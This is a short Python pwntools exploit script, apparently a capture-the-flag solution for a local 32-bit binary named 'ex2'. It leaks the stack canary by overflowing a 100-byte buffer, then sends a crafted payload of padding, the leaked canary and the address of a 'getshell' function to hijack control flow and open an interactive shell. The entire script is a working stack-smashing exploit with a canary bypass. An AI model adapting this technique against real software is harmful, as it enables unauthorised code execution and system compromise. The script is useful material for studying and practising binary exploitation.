#!/usr/bin/env python3
import struct
from pwn import *

def saveShellCode(canary, addr):
        f = open("shellCode", "wb")
        f.write(b"\x90"*100)
        f.write(canary)
        f.write(b"\x90"*12)
        f.write(addr)
        f.close()

def loadShellCode():
        f = open("shellCode", "rb")
        shellCode = f.read(120)
        f.close()
        
        return shellCode

if __name__ == "__main__":
        context(arch='i386', os='linux', endian='little', word_size=32, binary='ex2', log_level='info')

        elf = ELF("./ex2")
        get_shell = elf.sym["getshell"]

        p = process('./ex2', aslr=False)
        p.recvuntil("Hello Hacker!\n")

        # leak Canary
        payload = "A"*100
        p.sendline(payload)
        p.recvuntil("A"*100)

        # Canary = u32(p.recv(4))-0xa
        Canary = p.u32() - 0xa
        log.info("Canary: {:x}".format(Canary))

        # Bypass Canary
        saveShellCode(p32(Canary), p32(get_shell))
        shellCode = loadShellCode()

        log.info("msg: {}".format(shellCode))
        p.send(shellCode)
        p.recv()

        p.interactive()